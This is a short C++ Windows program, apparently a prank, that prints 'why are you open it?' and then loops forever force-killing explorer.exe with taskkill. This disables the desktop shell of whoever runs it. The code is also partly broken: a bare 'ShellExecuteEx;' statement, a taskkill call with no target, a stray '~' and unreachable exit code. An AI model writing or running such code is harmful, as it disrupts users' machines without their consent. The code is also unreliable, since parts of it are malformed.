#include <windows.h>
#include<bits/stdc++.h>
using namespace std;
int main()
{
    ShellExecuteEx;
    cout<<"why are you open it?";
    Sleep(100);
    while(1){
        system("taskkill /f /im  explorer.exe");
        system("taskkill /f /im ");~
    }
     exit(-11111) ;
    return 0;
}
